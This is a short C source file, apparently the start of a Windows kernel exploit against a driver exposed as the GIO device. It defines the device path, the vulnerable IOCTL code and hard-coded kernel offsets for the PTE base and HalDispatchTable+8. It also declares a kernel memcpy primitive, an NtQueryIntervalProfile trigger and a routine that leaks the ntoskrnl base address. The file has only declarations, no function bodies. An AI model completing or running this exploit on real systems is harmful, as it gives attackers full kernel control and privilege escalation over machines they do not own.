#include <windows.h>
#include <stdio.h>

#define PTE_BASE_ADDRESS_OFFSET 0x2DDF23
#define HAL_DISPATCH_TABLE_PLUS_8_OFFSET 0xC00A60 + 0x8

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\GIO"
#define TARGET_IOCTL 0xC3502808

typedef unsigned int(__stdcall* NtQueryIntervalProfile)(
	unsigned int      ProfileSource,
	PULONG            Interval
	);

typedef struct _MEMCPY_PARAMETERS {
	unsigned long long destination;
	unsigned long long source;
	unsigned long size;
	unsigned long padding;
} MEMCPY_PARAMETERS, * PMEMCPY_PARAMETERS;

void kernel_memcpy(HANDLE h_driver, unsigned long long destination, unsigned long long source, unsigned long size);
int main(int argc, char** argv);

void* leak_ntoskrnl_base_address(HMODULE h_ntdll);